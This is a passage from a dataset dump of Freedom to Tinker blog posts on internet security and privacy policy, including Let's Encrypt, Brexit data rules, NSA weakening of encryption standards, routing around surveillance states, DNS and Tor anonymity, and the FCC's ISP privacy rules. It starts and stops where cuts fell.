We updated the link to the final version of the paper following its publication at WWW 2015. The original link went to this draft version, which contains minor differences. [1] An exception is if the user routes traffic through Tor. Different requests can take different paths and the exit node IPs will be different. Thus, use of Tor with application-layer anonymization (e.g., Tor browser bundle) defeats our attack. [2] One-end foreign wireline interceptions inside the United States are generally governed by Section 702 of the FISA Amendments Act. Two-end foreign interceptions inside the United States are generally governed by Executive Order 12333. Interceptions outside the United States are also generally governed by Executive Order 12333."
"198","2014-11-18","2023-03-24","https://freedom-to-tinker.com/2014/11/18/announcing-lets-encrypt/","HTTPS, the cryptographic protocol used to secure web traffic as it travels across the Internet, has been in the news a lot recently. We’ve heard about security problems like Goto Fail, Heartbleed, and POODLE — vulnerabilities in the protocol itself or in specific implementations — that resulted in major security headaches. Yet the single biggest problem with HTTPS is that not enough sites use it. More than half of popular sites — and a much larger fraction of sites overall — still use old-fashioned HTTP, which provides no cryptographic protection whatsoever. As a result, these sites and their users are vulnerable to eavesdropping and manipulation by a range of threat vectors, from compromised WiFi access points to state-level mass surveillance. When deployed correctly, HTTPS defends against all these attacks. Why don’t more sites use HTTPS? The major obstacle is that it’s too difficult for web sites to set up and maintain. Switching to HTTPS involves purchasing a digital certificate (a cryptographic statement that your domain name belongs to you) from a “certificate authority,” an identity-checking organization that users’ browsers are programmed to trust. This process involves a long series of manual steps, as well as fees that range from tens to hundreds of dollars a year. Site operators must also navigate a complicated process to generate crypto keys, validate the site’s identity, retrieve a certificate, and configure their server to use it. These steps, which have to be repeated every year or so when the certificate expires, are also prone to human error, with the result that a substantial fraction of all HTTPS sites have configuration problems that jeopardize their security. For the past two years, I’ve been working with a talented group of people to do something about these problems. My student James Kasten and I joined forces with Peter Eckersley and Seth Schoen from EFF and Eric Rescorla, Josh Aas, and Richard Barnes from Mozilla. Our goal is to remove the barriers to deploying HTTPS and see an encrypted web completely replace unencrypted HTTP. Today, we’re announcing Let’s Encrypt, a new certificate authority we’re creating that will begin operation in Summer 2015. What makes Let’s Encrypt different is that it takes the pain out of switching to HTTPS. Web site operators simply install a small piece of software that takes care of the entire process. This software interacts with Let’s Encrypt to validate the server’s identity, obtain a certificate, securely configure the server to use HTTPS, and automatically renew the certificate when necessary. With Let’s Encrypt, one click or one command is all it will take for a site to deploy HTTPS. It’s also going to be free. With the rest of the process automated, arranging payment would be the one remaining headache, as well as a barrier to adoption for smaller sites and individuals. Let’s Encrypt will do away with fees and provide domain-validated certificates to nearly any server with a domain name, at zero cost. Becoming a certificate authority isn’t a simple process, but we’ve already cleared some of the biggest hurdles. We recently completed a cross-signing agreement with IdenTrust that will let certificates from Let’s Encrypt be trusted by almost all web browsers from day one. We’re also going to work with browser makers to have our root integrated into major browsers going forward, to ensure lasting trust. Let’s Encrypt will be operated by a new organization called ISRG, the Internet Security Research Group. ISRG, chartered to work towards a more secure Internet in the public interest, is a California public benefit corporation whose mission is to reduce financial, technological, and education barriers to secure communication over the Internet. Crucially, ISRG has “research” right in its name. It will serve as a vehicle for conveying advances from security research into practice more quickly. For instance, Let’s Encrypt will involve a number of new technologies, such as an automated certificate management protocol we’re developing called ACME, which includes support for new and stronger forms of domain validation. ISRG and Let’s Encrypt are being made possible by an amazing group of sponsors, including Cisco, Akamai, Mozilla, IdenTrust, and EFF. We are still welcoming additional sponsors — if your company or organization is interested in providing financial support for this effort, please get in touch. We have a lot of work left to do before we can start providing Let’s Encrypt to web site operators: We have to complete the software that will power the CA, the certificate management software for use by web sites, and the open, secure protocol that they’ll use to speak to each other. Today, we’ve posted a draft protocol specification and prototype implementations, which are available on Github. If you’d like to help by contributing to development and security review, please take a look at the code. For server operators, watch this space. Let’s Encrypt will be available starting in Summer 2015, making free, automatic, browser-trusted HTTPS certificates available to everyone. More links: Let’s Encrypt web site EFF blog post EFF press release Andreas Gal’s blog post Demo video by James Kasten J. Alex Halderman is a computer science professor at the University of Michigan and director of Michigan’s Center for Computer Security and Society."
"199","2016-07-25","2023-03-24","https://freedom-to-tinker.com/2016/07/25/brexit-exposes-old-and-deepening-data-divide-between-eu-and-uk/","After the Brexit vote, politicians, businesses and citizens are all wondering what’s next. In general, legal uncertainty permeates Brexit, but in the world of bits and bytes, Brussels and London have in fact been on a collision course at least since the 90s. The new British prime minister, Theresa May, has been personally responsible for a deepening divide across the North Sea on data and communication policy. Although EU citizens will see stronger privacy and cybersecurity protections through EU law post-Brexit, multinational companies should be particularly worried about how future regulation will treat the loads of data they traffic about customers, employees, and deals between the EU and the UK. The UK has frustrated European privacy and cybersecurity policy for decades. In my recently published book Securing Private Communications, I describe how the UK blocked a visionary EU Council Decision on Information Security in 1990. In 1997, the Brits deleted end-to-end encryption requirements for telecommunications providers from the predecessor of the current E-Privacy Directive. Since 2012, London structurally sought to obstruct and delay the legislative process of the new EU General Data Protection Regulation and the Network and Information Security Directive. On data and communications policy, the EU and the UK have always been strange bedfellows. On a deeper level, the EU and the UK fundamentally disagree about the value of human rights in policymaking. In fact, a vast body of European human rights jurisprudence originates in proceedings against British legal initiatives or launched by British citizens against their own government – especially with regard to privacy. A case in point is the famous 2008 ‘Liberty’-ruling of the Strasbourg Court of Human Rights on mass surveillance by British intelligence services of all Northern Irish citizens. In 2014, the Luxembourg EU court demolished the EU Data Retention Directive, the controversial surveillance measure launched by former Prime Minister and EU President Tony Blair in 2006, upon the request of then US President George W. Bush. The monumental ruling created a crucial precedent for the widely covered dismissal in 2015 of the Safe Harbor data-deal between the EU and the US by the EU Court. Although the UK is legally bound by European judgements, the concept of a powerful and continental human rights court apparently amounts to an indigestible oxymoron for any conservative Briton. Indeed, as Justice Minister, the brand new Prime Minister Theresa May launched the Investigatory Powers Bill, draconian surveillance legislation next to which the EU Data Retention Directive, demolished by the EU Court, pales in comparison. Rather than comply with European court rulings, Theresa May repeatedly campaigned for leaving European human rights treaties altogether. Even if she weakened her tone in recent weeks to safeguard support for her new job, even the posh Foreign Policy magazine recently dubbed May Britain’s new Snooper-in-Chief. Brexit brings good news for Europeans that value privacy and freedom: the EU’s data and communications policy will no longer be influenced by Perfide Albion. But for entrepreneurs—and especially multinationals—Brexit is a potential nightmare. The crucial question is whether the European Commission will grant the UK the label of “adequate level of protection for European data”. Norway, for example, goes to great lengths to comply with EU legislation, so no data transfer restrictions exist; as a perk, Norway sits in on the European meetings of national Data Protection Agencies. Yet, national policies in the UK tend towards the US approach to data protection, and the US structurally fails to provide adequate data protection according to the EU Court. Many argue that the new data-deal between the EU and the US—the so-called “Privacy Shield”—still doesn’t meet those standards. Law firms, such as the one I work for, advise multinationals not to rely solely on the new data-deal for their global data transfers. If the UK fails to meet the test of adequacy, the legal basis of data transfers across the North Sea of most companies evaporates. All cloud and data contracts of multinational organizations must be reviewed and revised. Data-intensive businesses are likely to move shop, settle within the EU, and bid farewell to the Old Country. After Brexit, the superficial data marriage between the strange bedfellows across the North Sea will no longer be bound by treaty. While Snowden’s disclosures still echo across EU policy theaters, Britain’s new Snooper-in-Chief and multinationals will throw all money, power, and counseling at their disposal towards saving the data marriage between the EU and the UK. Even if the economic stakes are substantial, over the last decades deep political and constitutional developments have rather been pushing the EU and the UK towards a data divorce."
"200","2014-12-05","2023-03-24","https://freedom-to-tinker.com/2014/12/05/expert-panel-report-a-new-governance-model-for-communications-security/","Today, the vulnerable state of electronic communications security dominates headlines across the globe, while surveillance, money and power increasingly permeate the ‘cybersecurity’ policy arena. With the stakes so high, how should communications security be regulated? Deirdre Mulligan (UC Berkeley), Ashkan Soltani (independent, Washington Post), Ian Brown (Oxford) and Michel van Eeten (TU Delft) weighed in on this proposition at an expert panel on my doctoral project at the Amsterdam Information Influx conference. Why are electronic communications vulnerable in the first place? And to what extent is law an appropriate tool to augment communications security? While the U.S. regulator seems to entrust the market and the N.S.A. to augment communications security, the European Union has launched or debated sweeping regulatory initiatives in all five subareas of communications security policy in 2013: data protection, electronic communications, encryption, cybercrime and ‘network and information security’ (includes critical infrastructure protection). Add to that political dynamics such as the opening of the legislative season after summer, as well as the E.U. elections last May spurring a rotating European Parliament and Commission. And then there’s the Snowden revelations, the release of the U.S. Cybersecurity Framework, and daily headlines about the next big communications security breach. A perfect time for reflection and debate. Michel van Eeten (Delft University) kicked off the discussion by stressing that we’re only starting to understand why and how communications security is, or often isn’t, produced by the market. Only upon understanding the incentives for internet security, regulation may a useful tool. He illustrated his observations by taking us through an article on HTTPS governance, recently published in the Communications of the ACM (disclaimer: I’m a co-author on the paper). The main technical vulnerability of HTTPS, that aims to offer end-to-end encryption signaled by a padlock in your web browser, is well-known: any certificate authority can sign an encryption certificate for any website, so if someone (say, a company, government or cybercriminal) breaches one of the hundreds of certificate authorities around, the security of the entire HTTPS ecosystem on the internet may collapse (the ‘weakest link’ problem). Its most important practical implication, is that from a communications security perspective, it doesn’t matter that much where you buy your certs. What is not well-understood, however, are the market dynamics of HTTPS: three companies control 75% of a lucrative market in issuing certs, and the multi-billion dollar E-Commerce market that depends on it. These large corporations in HTTPS security have, not unlike big financial institutions, become too big to fail. The ultimate measure to leverage security is to revoke trust in a breached CA. Big and small are being breached all the time, but revoking trust in a large CA is close to impossible: to distrust all the certificates issued by a large CA, would render large parts of the encrypted web inaccessible. Confidentiality and integrity interests conflict with availability interests, and the market prefers business continuity over everything else. Smart sites infer that buying from large CAs is an insurance policy for the availability of a (seemingly) securely encrypted site, further exacerbating a ‘too big to fail’ dynamic. To make securing HTTPS more complicated, some of the larger CAs have close ties to governments (and most large countries even control their own root CAs), implying that government oversight against communications surveillance – one of the objectives of the encryption – is a thorny issue as well. As long as these fundamental issues are not addressed technically, the effect of oversight and regulation are limited to providing the right incentives for all the stakeholders in the CA ecosystem to actually do something about the fundamentally flawed security model of HTTPS. Van Eeten posits that large CAs, central players in this debate, have little interest in actually strengthening security, an insight the proposed E.U. regulation fails to address. Ashkan Soltani extrapolated from Michel van Eeten’s observations, arguing that the technical vulnerabilities we face all boil down to connectivity as a core design goal in internet protocols, software and hardware; rather than security. Moreover, the conventional limits on information are disappearing: access to information has become ubiquitous and low-cost for users and intelligence agencies alike. He also pointed at the parallel incentives of government and the big data industry in collecting data. All quite fundamental drivers that are hard to change and relate to communications confidentiality and security. From working with the Snowden documents, Soltani used the MUSCULAR revelations as a case study to show how the U.S. government carefully chooses its locations for surveillance of global communications, to circumvent legal safeguards for U.S. persons. And in the aftermath of the ANGRYBIRDS revelations, the Government defended its operations claiming that they merely piggybacked on surveillance done by online advertisers anytime you play popular games or visit websites. Another disturbing practice is how IP-addresses are used to determine ‘foreignness’ of affected internet users in dragnet surveillance operations, with which Soltani in fact forecasted later Snowden revelations he helped release with the Washington Post. Here, a fascinating audience debate ensued, eventually leading to the formulation of a number of systematic communications security vulnerabilities from a technical, market, legal and human security perspectives. Apart from those usually agreed on and already mentioned, usability, the lack of sound legal definitions for communications security and the lack of regulation on exploiting vulnerabilities by governments were added to the mix. Next up was Ian Brown. He posited the question that if (adding this is a big ‘if’), regulation is needed to augment security, what types of regulator can have a go at it, and what are their strengths and weaknesses? Ian discussed four conventional communications security regulators – national security agencies, telecoms regulators, standards bodies and data protection authorities (including the FTC) – and identified three pre-conditions for their effectiveness: the ability to i) realize technical competence and nuance, ii) facilitate public interest consensus among stakeholders, and iii) change their behaviour. Snowden, Brown argues, has reminded us of how central communications surveillance is to national security. As a core executive function, we see a great reluctance, even today, to concede its regulation to Parliament; never mind the judiciary or regulators. Telecoms regulators are primarily concerned with addressing monopolies, rather than ensuring security. At times, standards bodies have been excellent at managing (i) complexity and (ii) consensus, but can only change (iii) behaviour through deployment by hardware, software and infrastructure stakeholders. However, their culture is vastly different and critical as to their competences, comparing NIST, ITU, ETSI and IETF. Data protection authorities, greatly aided by the European Court of Justice Google v. Spain (‘Right to be Forgotten’) and Data Retention Directive rulings, will move into this space as well, and have been hiring tech specialists in recent years. Finally, Brown argued that legislators need to reduce the pervasive negative externalities in communications security, notably through introducing liability for ISPs, banks and software providers for security breaches, coupled with strong enforcement. Likely, he concluded, a mix of all four regulators is necessary. Deirde Mulligan set out to re-orient our focus from ‘what systems fail’, to ‘how to manage insecurity’. Rather than prevention, she defended an approach of accountability post-breach, as we don’t know how to secure networked systems upfront. The emphasis of regulators and systems designers on creating the right process could be wrong, because threat models evolve all the time. She shared her ideas on public health as a doctrine for cybersecurity with the audience, pointing at the parallels of securing communications with curing patients, for example in defense of quarantining systems just as you would with humans upon infected by serious viruses. Mulligan also pointed out that as it stands, the definitions in computer science around confidentiality, integrity and availability (and beyond) don’t map well onto law, and that this area needs a serious cross-disciplinary conversation, as it causes people across academic and policy communities to mean something completely different, even when they are using the same words. In the final conversation with the audience, several additional insights came up, all ending with a rather fundamental reflection on security. First, participants wondered if the real question at hand is not so much how to secure communications, but what level of insecurity society will tolerate? Currently, regulatory development in this space is incident-driven. For example, the Snowden revelations (esp. MUSCULAR) have incentivized large U.S. internet companies to encrypt traffic between their servers to prevent backdoor access by intelligence agencies, calling to limit access to user data via the front door through regulated access regimes. Here, a former senior IBM employee shared with the audience that Snowdens revelations had already been ‘business as usual’ within industry for decades. The disclosures have apparently changed the cost-benefit analysis of these companies for the benefit of communications security. Another insight came from general systems engineering, which distinguishes ‘precluded event security’ (breach prevention at all costs, as in aviation) and ‘marginal security cost’ (cost-benefit analysis whether prevention is viable). What specific communications security issues map where on this scale? For one, the Data Retention Ruling of the highest E.U. Court recently established that ISPs and telecoms companies have to do more than simple cost-benefit analysis in their risk-assessment of securing databases with customer metadata for surveillance purposes. When datasets or communications are as sensitive as in this case, it seems a constitutional requirement nowadays in Europe to secure communications to prevent breaches. While the ruling is quite vague, the constitutional dimension of the explicitly named confidentiality, integrity and availability triad is an important topic for further research. Finally, the conversation morphed into a somewhat sociological evaluation whether the usual risk-assessment and accountability focus in communications security should be attributed to risk-obsessed societies, a lack of creativity or rather a failure in legislative and democratic governance. Here, CITP’s Joel Reidenberg proposed whether the latter is the case in the U.S. The panel and audenice agreed that regulatory dreadlock abounds across the board. But the jury is still out whether and how the proposed E.U. regulations will materialize, and in what form. Unfortunately, former Member of European Parliament Amelia Andersdottir called in sick on the day of the panel, as she probably would have a thing or two to say on the matter. Certainly, the panel brought some clarity both with regard to what vulnerabilities need to be addressed, and what we can expect from the law to augment security. As cliché as this might sound, communications systems security may appear technically complex and hard or impossible to secure. But aviation, automobiles and the telegraph face(d) similar questions; it always took time to address security properly, and failures will alway happen. Communications now need somewhat of an overhaul to address systemic vulnerabilities, especially in todays networked environment and tomorrows ‘the internet of things’: when your home appliances are connected to the web and can be controlled with your smartphone from a distance, communications security will truly become tangible for consumers. Complex technical systems have always been embedded in economic, social and cultural environments that impact our understanding of security, from who or what we want to be secured, and our tolerance for insecurity. Obviously, understanding and tolerance change over time, sometimes quite rapidly as the momentum heats up. In the end, even in what seems a complex technical space of communications security, new governance models for communications security emerge when money, power and perhaps a constitutional requirement or two enter the room. Even in communications security, we remain human after all."
"201","2013-09-09","2023-03-24","https://freedom-to-tinker.com/2013/09/09/nsa-apparently-undermining-standards-security-confidence/","The big NSA revelation of last week was that the agency’s multifaceted strategy to read encrypted Internet traffic is generally successful. The story, from the New York Times and ProPublica, described NSA strategies ranging from the predictable—exploiting implementation flaws in some popular crypto products; to the widely-suspected but disappointing—inducing companies to insert backdoors into products; to the really disturbing—taking active steps to weaken public encryption standards. Dan wrote yesterday about how the NSA is defeating encryption. To understand fully why the NSA’s actions are harmful, consider this sentence from the article: Many users assume — or have been assured by Internet companies — that their data is safe from prying eyes, including those of the government, and the N.S.A. wants to keep it that way. In security, the worst case—the thing you most want to avoid—is thinking you are secure when you’re not. And that’s exactly what the NSA seems to be trying to perpetuate. Suppose you’re driving a car that has no brakes. If you know you have no brakes, then you can drive very slowly, or just get out and walk. What is deadly is thinking you have the ability to stop, until you stomp on the brake pedal and nothing happens. It’s the same way with security: if you know your communications aren’t secure, you can be careful about what you say; but if you think mistakenly that you’re safe, you’re sure to get in trouble. So the problem is not (only) that we’re unsafe. It’s that “the N.S.A. wants to keep it that way.” The NSA wants to make sure we remain vulnerable. Of course, we “have been assured by Internet companies” that we are safe. It’s always wise to be wary of vendors’ security assurances—there’s a lot of snake oil out there—but this news calls for a different variety of skepticism that doubts the assurances of even the most earnest and competent companies. This is going to put U.S. companies at a competitive disadvantage, because people will believe that U.S. companies lack the ability to protect their customers—and people will suspect that U.S. companies may feel compelled to lie to their customers about security. The worst news of all, in my view, is that the NSA has taken active steps to undermine public encryption standards. When I teach the history of encryption standards, I talk about the Data Encryption Standard (DES), published by the U.S. government in 1978, which was one of the most commonly used encryption methods for decades. Some aspects of the DES design were mysterious and there were rumors that the NSA had built in secret weaknesses. Years later, researchers discovered a powerful new codebreaking method called differential cryptanalysis—and found that DES was resistant to it. We now know that the NSA had whispered in the ears of the original DES design team to make sure the standard was secure against differential attacks, which NSA had discovered earlier. In other words, the NSA intervened secretly to improve the security of DES. The successor of DES is the Advanced Encryption Standard (AES), published by the National Institute of Standards and Technology (NIST) in 2001. NIST went to great lengths to make the AES process as open and transparent as possible, and the result was a standard with broad buy-in from cryptographers around the world. Once again, the US government seemed to be doing its best to choose a high-security, trustworthy standard. At the same time, there have been persistent rumors, and some evidence, over the years that the NSA has been working to undermine certain security standards. Now it seems that these rumors are confirmed, and the NSA has been undermining standards, which makes everyone—including every American—less secure. How has the NSA sought to undermine standards? I’ll discuss two likely examples in the next post."
"202","2016-08-30","2023-03-24","https://freedom-to-tinker.com/2016/08/30/routing-detours-can-we-avoid-nation-state-surveillance/","Since 2013, Brazil has taken significant steps to build out their networking infrastructure to thwart nation-state mass surveillance. For example, the country is deploying a 3,500-mile fiber cable from Fortaleza, Brazil to Portugal; they’ve switched their government email system from Microsoft Outlook to a state-built system called Expresso; and they now have the largest IXP ecosystem in the world. All of these measures aim to prevent the country’s Internet traffic from traversing the United States, thereby preventing the United States from conducting surveillance on their citizens’ data. But Brazil isn’t the only country that has concerns about their Internet traffic passing through the United States. Deutsche Telekom lobbied for tougher privacy protection by keeping German traffic within its national borders. Canadian traffic has been found to routinely pass through the United States, which is a violation of Canadian network sovereignty. Russian president Putin has called for “better protection of communication networks” and passed a law that requires foreign companies to keep Russian users’ data on servers inside the country. To quantify which countries Internet traffic traverses and measure how successful any particular country might be at detouring its traffic around known surveillance states, we actively measured and analyzed the traffic originating in five different countries: Brazil, Netherlands, Kenya, India, and the United States. First, to understand the current state of transnational routing (the “status quo”), we measured the country-level traffic paths for the Alexa Top 100 domains in each respective country using RIPE Atlas probes and the MaxMind geolocation service. Next, we measured how successful clients in Brazil, Netherlands, Kenya, India, and the United States might be at avoiding other countries of interest using open DNS resolvers and using an overlay network. The rest of this post summarizes these two parts of the study and highlights some of the results. The Status Quo: Even Local Traffic Can Detour through Surveillance States Despite the extreme efforts of certain countries to “keep local traffic local”, and in particular to avoid having traffic traverse the United States, our measurement study indicates that these goals have not yet been reached, for two reasons: 1) lack of domain hosting diversity and 2) lack of routing diversity. Lack of Hosting Diversity. We find that hosting for many popular websites lacks diversity. We found that about half of the Alexa Top 100 domains are hosted in a single country; in these cases, a user cannot avoid the domain’s hosting country when accessing it. In many cases, even popular local websites are hosted outside the country where citizens are trying to access them. For example, more than 50% of the top domains in Brazil and India are hosted in the United States; in total, about 50% of the .br domains are hosted outside Brazil. More hosting diversity, as could be enabled with CDNs, would allow for the potential to avoid more countries more often. Lack of Geographic Diversity. Internet paths also lack geographic diversity: about half of the paths originating in Kenya to the most popular Kenyan websites traverse the United States or Great Britain. Much of this phenomenon is due to “tromboning,” whereby an Internet path starts and ends in a country, yet transits an intermediate country; for example, about 13% of the paths that we explored from RIPE Atlas probes in Brazil to the top domains in Brazil trombone through the United States. More than 50% of the paths from the Netherlands to their top domains transit the United States, and about half of Kenyan paths traverse the United States and Great Britain. Towards User-Controlled Routing Detours We next asked whether clients could take advantage of the fact that many popular websites are georeplicated, coupled with a client’s ability to selectively “bounce” packets through overlay nodes, might give some users opportunities to avoid certain countries. We studied whether users could exploit open DNS resolvers to discover hosting diversity, and overlay network relays to intentionally introduce routing detours. Previous work in overlay networks, such as RON, tries to route around failures, whereas our work tries to route around countries. Our results show that in some cases, users can select paths to specifically avoid certain countries; in cases where local traffic leaves the country only to return (a phenomenon sometimes called “tromboning”), the use of local relays can sometimes ensure that local traffic stays within the country. For example, without these techniques, Brazilian traffic transited Spain, Italy, France, Great Britain, Argentina, Ireland (among others). Using even a modest overlay network deployment of 12 relays across 10 countries (Brazil, United States, Ireland, Germany, Spain, France, Singapore, Japan, South Korea, and Australia), clients in Brazil could completely avoid these countries for the top 100 domains. The overlay network can also be used to keep local traffic local; the percentage of tromboning paths from Brazil decreases from 13.2% of domestic paths to 9.7%. Unfortunately, some of the more prominent surveillance states are also some of the least avoidable countries. Most countries depend highly on the United States for connectivity to other locations on the Internet. Neither Brazil, India, Kenya, nor the Netherlands can completely avoid the United States with the country avoidance techniques. The inability of these techniques to successfully avoid the United States typically results from the lack of hosting diversity for many websites, which are solely hosted in the United States. Using the overlay network, both Brazilian and Netherlands clients were able to avoid the United States for about 65% of sites; even in these cases, the United States is completely unavoidable for about 10% of sites. Traffic from Kenya can avoid the United States for only about 40% of the top domains. On the other hand, the United States can avoid every other country for all sites, with the exception of France and the Netherlands which the United States can nonetheless avoid for 99% of the top 100 domains. More Information and Next Steps A more detailed writeup is available on the RANSOM project website (https://ransom.cs.princeton.edu/). Encouraged by the ability to use overlay networks to avoid surveillance states in certain cases, we are in the process of designing and building a RANSOM prototype. We welcome feedback on this project as we embark on the next steps."
"203","2016-09-29","2023-03-24","https://freedom-to-tinker.com/2016/09/29/the-effect-of-dns-on-tors-anonymity/","This blog post is joint work with Benjamin Greschbach, Tobias Pulls, Laura M. Roberts, and Nick Feamster. Counting almost two million daily users and 7,000 relays, the Tor network is the largest anonymity network operating today. The Tor Project is maintaining a privacy-enhanced version of the popular Firefox web browser—Tor Browser—that bounces its network traffic over the Tor network. By using Tor Browser, users can protect their web browsing from government surveillance, stalkers, advertisement-injecting ISPs, and nosy neighbors. Tor works by decoupling a user’s identity (i.e., the IP address, which reveals where in the world you are) from her activity (e.g., visiting Facebook). When using Tor, your ISP can no longer learn what websites you visit, but it does know that you are using Tor. The website you visit (e.g., Facebook) will also know that you are using Tor, but it will not learn your IP address. The EFF maintains a great interactive diagram, illustrating information leakage in several scenarios. While the use of Tor constitutes a significant privacy gain over off-the-shelf web browsers, it is no panacea, and the Tor Project is upfront about its limitations. These limitations are not news to the research community. It is well understood that low-latency anonymity networks such as Tor cannot protect against so-called global passive adversaries. We define such adversaries as those with the ability to monitor both network traffic that enters and exits the network. Then the adversary can run a correlation attack, meaning that it can match packets that go into the network to packets that leave it, or in other words, it can link a client’s identity (her IP address) to her activity (e.g., visiting Facebook), and thus, break anonymity. By design, Tor cannot protect against these global passive adversaries. However, there is still merit in understanding which organizations are in a position to launch such attacks and how practical these attacks are. Only then can we gain an understanding of how much of a real-world threat these attacks constitute. The research community has put a lot of effort into modeling correlation attacks and their effect on Tor users. To date, these studies have modeled mostly web traffic, i.e., HTTP over port 80 and HTTPS over port 443, which makes sense as web traffic likely constitutes the bulk of a typical Tor user’s online activity. However, there is more to network traffic than just web traffic. Before a browser can fetch a web page such as Facebook, it has to send out a DNS request to learn that the domain facebook.com is reachable via its IP address 173.252.120.68 (among others). DNS traffic is ubiquitous, both over and outside of Tor, so how does this relate to correlation attacks? DNS is a very different beast than HTTP, which is what most research has studied. HTTP traffic travels from a user’s exit relay directly to one or more web servers. DNS traffic, however, can traverse very different paths, depending on how exit relays (the relays in the Tor network that provide the link between Tor and the Internet) are configured. In particular, we find that DNS traffic traverses many networks that are entirely different than the networks that subsequent web traffic traverses. This means that past research likely underestimated the threat of correlation attacks because there are entities on the Internet such as ISPs, autonomous systems, or Internet exchange points that can monitor some DNS traffic but not web traffic coming out of the Tor network and potentially use the DNS traffic to deanonymize Tor users. Past traffic correlation studies have focused on linking the TCP stream entering the Tor network to the one(s) exiting the network. We show that an adversary can also link the associated DNS traffic, which can be exposed to many more autonomous systems than the TCP stream. After many months of work, we have published a research paper on how DNS affects Tor’s anonymity. In our work, we show how an adversary can combine monitored DNS requests with well-understood website fingerprinting attacks to create a new type of DNS-enhanced correlation attack, or DNS-enhanced website fingerprinting attack, depending on how you look at it. We know of several organizations that are in a position to use these attacks, notably Google. Because it operates a popular open DNS resolver, the company can already observe many DNS requests. Additionally, Google can monitor some network traffic that is entering the Tor network: for example, via Google Fiber, via guard relays that are occasionally run in Google’s cloud, and formerly via meek app engine, which is now defunct. Our results show that by monitoring DNS traffic, an attacker can enhance a website fingerprinting attack to be highly reliable. When our new, combined attack identifies a website, it is highly likely to be correct for a large number of websites on the Internet. Furthermore, we show that our new type of attack works well on websites that are infrequently visited over the entire Tor network globally. Presumably, this includes censored websites in different regions of the world and websites for whistleblowers and activists, who are in many ways Tor users in most need of protection. Beyond further motivating the deployment of website fingerprinting defenses in Tor, our attack has implications for the design of such defenses: they should probably be stronger than previously thought. Our study also provides new insight into the current state of exit relays in the Tor network: We find that a significant fraction of exit relays send DNS requests to Google’s public resolvers. Google sees about one–third of DNS requests that exit from the Tor network—an alarmingly high fraction for a single company, particularly because Tor’s very design avoids centralized points of control and observation. Although Tor is reasonably decentralized, our work shows that this does not hold for the wider ecosystem that Tor exists in. We also simulate the Internet-scale implications of our work using the Tor Path Simulator (TorPS). This allows us to understand what-if scenarios such as the implications for Tor users if all exit relays were to run their own local resolvers. Our results show that while running local DNS resolvers on exit relays has its benefits, it also means that DNS requests are very exposed to network-level adversaries. So what does our work mean for Tor users? We believe that there is no immediate cause for concern. Adversaries that can already monitor large fractions of the Internet—for many people, the biggest threat—will not do any better with our attack. Instead, we investigate how “semi-global” adversaries can get the most out of the data they have. Finally, the Tor Project is already working on techniques to make website fingerprinting attacks harder. Our project page has more information about our study. Together with the research paper that is now under review, we also publish our code, data, and detailed instructions to replicate our work."
"204","2017-08-22","2023-03-24","https://freedom-to-tinker.com/2017/08/22/help-us-improve-the-usability-of-tor-and-onion-services/","Update 2017-09-11: We have collected several hundred responses, so we are now closing the survey to begin data analysis. Thanks for your help! We are looking for volunteers for a study to improve the usability of Tor and onion services, but first some background: The Tor network is primarily known for client anonymity, that is, users can download Tor Browser and browse the Internet anonymously. A slightly lesser-known feature of Tor is server anonymity. It is possible to set up web servers—and other TCP-based services—whose IP address is hidden by the Tor network. We call these “hidden” servers onion services. Several well-known web sites such as Facebook, DuckDuckGo, and ProPublica have started to offer onion services in addition to their normal web sites. Onion services differ from normal web services in several aspects; for example in their unusual domain format (an example is expyuzz4wqqyqhjn.onion, The Tor Project’s onion site) and in the way users connect to them—onion services are only accessible over Tor. In this research project, we are trying to understand how users deal with these differences by administering a survey to Tor users. A sound understanding of how users interact with onion services will allow privacy engineers to both improve onion service usability and better protect Tor users from surveillance, censorship, and other attacks. You can help our research by filling out our survey (the survey is closed as of 2017-09-11). To learn more about our work, visit our project page, and don’t hesitate to get in touch with us if you have any questions."
"205","2016-10-31","2023-03-24","https://freedom-to-tinker.com/2016/10/31/the-effects-of-the-forthcoming-fcc-privacy-rules-on-internet-security/","Last week, the Federal Communications Commission (FCC) announced new privacy rules that govern how Internet service providers can share information about consumers with third parties. One focus of this rulemaking has been on the use and sharing of so-called “Consumer Proprietary Network Information (CPNI)”—information about subscribers—for advertising. The Center for Information Technology Policy and the Center for Democracy and Technology jointly hosted a panel exploring this topic last May, and I have previously written on certain aspects of this issue, including what ISPs might be able to infer about user behavior, even if network traffic were encrypted. Although the forthcoming rulemaking targets the collection, use, and sharing of customer data with “third parties”, an important—and oft-forgotten—facet of this discussion is that (1) ISPs rely on the collection, use, and sharing of CPNI to operate and secure their networks and (2) network researchers (myself included) rely on this data to conduct our research. As one example of our work that is discussed today in the Wall Street Journal, we used DNS domain registration data to identify cybercriminals before they launch attacks. Performing this research required access to all .com domain registrations. We have also developed algorithms that detect the misuse of DNS domain names by analyzing the DNS lookups themselves. We have also worked with ISPs to explore the relationship between Internet speeds and usage, which required access to byte-level usage data from individual customers. ISPs also rely on third parties, including Verisign and Arbor Networks, to detect and mitigating attacks; network equipment vendors also use traffic traces from ISPs to test new products and protocols. In summary, although the goal of the FCC’s rulemaking is to protect the use of consumer data, the rulemaking could have had unintended negative consequences for the stability and security of the Internet, as well as for Internet innovation. In response to the potential negative effects this rule could have created for Internet security and networking researchers, I filed comment with the FCC highlighting how network operators researchers depend on data to keep the network operating well, to keep it secure, and to foster continued innovation. My comment in May highlights the type of data that Internet service providers (ISPs) collect, how they use it for operational and research purposes, and potential privacy concerns with each of these datasets. In my comment, I exhaustively enumerate the types of data that ISPs collect; the following data types are particularly interesting because ISPs and researchers rely on them heavily, yet they also introduce certain privacy concerns: IPFIX (“NetFlow”) data, which is the Internet traffic equivalent of call data records. IPFIX data is collected at a router and contains statistics about each traffic flow that traverses the router. It contains information about the “metadata” of each flow (e.g., the source and destination IP address, the start and end time of the flow). This data doesn’t contain “payload” information, but as previous research on information like telephone metadata has shown, a lot can be learned about a user from this kind of information. Nonetheless, this data has been used in research and security for many purposes, including (among other things) detecting botnets and denial of service attacks. DNS Query data, which contains information about the domain names that each IP address (i.e., customer) is looking up (i.e., from a Web browser, from an IoT device, etc.). DNS query data can be highly revealing, as we have shown in previous work. Yet, at the same time, DNS query data is also incredibly valuable for detecting Internet abuse, including botnets and malware. Over the summer, I gave a follow-up a presentation and filed follow-up comments (several of which were jointly authored with members of the networking and security research community) to help draw attention to how much Internet research depends on access to this type of data. In early August, a group of us filed a comment with proposed wording for the upcoming rule. In this comment, we delineated the types of work that should be exempt from the upcoming rules. We argue that research should be exempt from the rulemaking if the research: (1) aims to promote security, stability, and reliability of networks, (2) does not have the end-goal of violating user privacy; (3) has benefits that outweigh the privacy risks; (4) 